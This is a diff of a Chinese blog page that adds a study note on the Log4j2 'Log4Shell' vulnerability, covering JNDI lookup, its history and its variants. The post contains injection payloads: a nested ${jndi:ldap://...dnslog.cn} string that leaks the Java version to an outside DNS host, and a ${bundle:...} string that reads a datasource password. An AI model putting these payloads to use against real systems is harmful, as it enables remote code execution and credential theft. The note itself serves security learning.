@@ -89,7 +89,7 @@
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
         <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
         <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">7</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a></li>
   </ul>
 </nav>
 
@@ -135,13 +135,13 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -171,6 +171,97 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="Kid">
+      <meta itemprop="description" content="行到水穷处，坐看云起时">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kid">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/01/Log4j2%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">Log4j2 相关总结(待修改，补充)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-01 09:33:00" itemprop="dateCreated datePublished" datetime="2022-01-01T09:33:00Z">2022-01-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-01-02 18:14:08" itemprop="dateModified" datetime="2022-01-02T18:14:08Z">2022-01-02</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>对java安全也不是很熟，平时也只是看一下攻击的姿势。<br>但这次毕竟安全圈大事，凑个热闹 简单学习下原理。<br>国外将其命名为 Log4Shell</p>
+<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="结构："><a href="#结构：" class="headerlink" title="结构："></a>结构：</h2><p>从上往下看 每一层 </p>
+<p>Java App<br>Jndi Api<br>Naming Manger<br>Jndi api<br>Ladp Dns  Rmi Corba</p>
+<h2 id="发展历程-2013年就存在的漏洞"><a href="#发展历程-2013年就存在的漏洞" class="headerlink" title="发展历程 2013年就存在的漏洞"></a>发展历程 2013年就存在的漏洞</h2><p>1.2013年，有人向Log4j2开源社区提交支持JNDI Lookup 插件的请求并被采纳</p>
+<p>2.2016年 首次黑客大会介绍Jndi<br><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p>
+<p>3.2021年爆发</p>
+<p>ps：个人觉得，其实这个洞应该早就被利用了，只是在某种利益的情况，被爆了出来。<br>    好多-1day 都掌握在某些人或团队手里</p>
+<h1 id="问题核心"><a href="#问题核心" class="headerlink" title="问题核心"></a>问题核心</h1><h2 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h2><h2 id="Jndi-的动态协议切换（正常功能）"><a href="#Jndi-的动态协议切换（正常功能）" class="headerlink" title="Jndi 的动态协议切换（正常功能）"></a>Jndi 的动态协议切换（正常功能）</h2><p> Log4j-core 自带的lookup有很多实例<br> log4j2是Java 日志开发框架 1.x 重写的。</p>
+<h2 id="简单原理"><a href="#简单原理" class="headerlink" title="简单原理"></a>简单原理</h2><p> 日志打印 遇到 ${ 分割执行<br> logger.error(“error_message:${jndi:ldap://xxx/class}”);<br> 变成<br> jndi:ldap://xxx/xxx  进入存在漏洞的 JndiLookup 实例,用 InitialContext.lookup去访问<br> 导致jndi代码执行</p>
+<h2 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h2><p>   “ElasticSearch利用Java的SecurityManager安全机制来防御文件操作和Socket操作，所以无法正常连接远程服务器”<br>   p牛的研究。所以其实有些有RASP，SecurityManager是无法rce的。</p>
+<p>   本地信息泄漏，报错回显：<br>   System.getProperty() ，System.getenv()，ResourceBundleLookup</p>
+<p>   展开来说：<br>   1.嵌套标签<br>    ${jndi:ldap://${java:version}.u2xf5m.dnslog.cn}<br>   2.sys env<br>    参考：<a target="_blank" rel="noopener" href="https://github.com/jas502n/Log4j2-CVE-2021-44228">https://github.com/jas502n/Log4j2-CVE-2021-44228</a><br>   3.Bundle<br>    参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a><br>    ${bundle:application:spring.datasource.password}<br>    条件：springboot加入log4j2依赖</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -810,7 +901,7 @@ bettercap也可以不使用，但使用hid模块，通过数据传输总量有�
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2021</span>
+  <span itemprop="copyrightYear">2022</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
